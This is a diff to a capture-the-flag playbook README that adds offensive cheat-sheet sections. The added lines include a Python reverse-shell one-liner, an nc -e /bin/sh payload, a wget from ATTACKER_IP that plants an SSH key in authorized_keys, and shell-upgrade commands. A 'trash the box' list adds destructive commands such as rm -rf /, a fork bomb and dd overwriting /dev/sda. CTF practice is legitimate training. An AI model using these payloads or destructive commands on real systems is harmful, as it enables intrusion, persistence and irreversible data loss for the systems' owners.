@@ -156,6 +156,16 @@ __Malicous File Upload__
 Deliver payload to the target
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)
 
+__Upload Maliscous File__
+```bash
+# Use the following techniques to upload malfiles such as php reverse shells
+
+# Upload via HTTP
+# Upload via FTP
+# Upload via TFTP
+# Upload via SMB
+```
+
 # Exploitation 
 Successful gain unauthorized access
 [![alt text](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Logo Title Text 1")](#reconnaissance-4)
@@ -187,6 +197,36 @@ If you really wanted to test this ability. You can use [Merlin](https://github.c
 Escalate to root  
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#actions-on-objectives)  
 
+__If You have a Reverse Shell...__
+```bash
+#Get a TTY shell after a reverse shell connection
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+#Set PATH TERM and SHELL if missing:
+$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+$ export TERM=xterm
+$ export SHELL=bash
+#Add public key to authorized keys:
+$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
+
+#Some payloads to overcome limited shells:
+$ ssh user@$ip nc $localip 4444 -e /bin/sh
+    enter user's password
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ export TERM=linux
+
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+$ echo os.system('/bin/bash')
+
+$ /bin/sh -i
+
+$ exec "/bin/sh";
+
+$ perl —e 'exec "/bin/sh";'
+```
+
 __Metasploit__
 ``` bash
 meterpreter: $ getsystem
@@ -216,15 +256,27 @@ Add your mark
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#documentation)
 
 A quick list of resources for celebrating your CTF root
-1.  Overwrite your website to CTF web server  
+1.  Overwrite your victory website to CTF web server  
 
 ```bash
+# Example, fork the template to make your own victory site
 git clone https://github.com/tcbutler320/ctf-playbook/tree/master/victory-mark
 
 rm -r /var/www
 cp victory-mark /var/www/
 
+```  
+2.  Trash the box, !VERY dangerous, you've been warned  [#trashthebox](https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/)
+```bash
+# Carnage (don't run this on anything you care about, you've been warned)
+$ rm -rf /
+$ :(){:|:&};:
+$ command > /dev/sda
+$ mv /home/user/* /dev/null
+$ dd if=/dev/random of=/dev/sda 
+
 ```
+
 
 # Documentation
 Documentation is important, as you will need to come back frequently to things you've found. 
@@ -239,6 +291,7 @@ There are countless resources and people who deserve credit for their contributi
 +  Credit and Resources  
     -    [CheatSheet God](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_PenTesting.txt)
     -    [Adam P](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png) : Logo
+    -    [Guif: Priv Escalation](https://guif.re/linuxeops)
 
 
 [logo]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Next Play" 
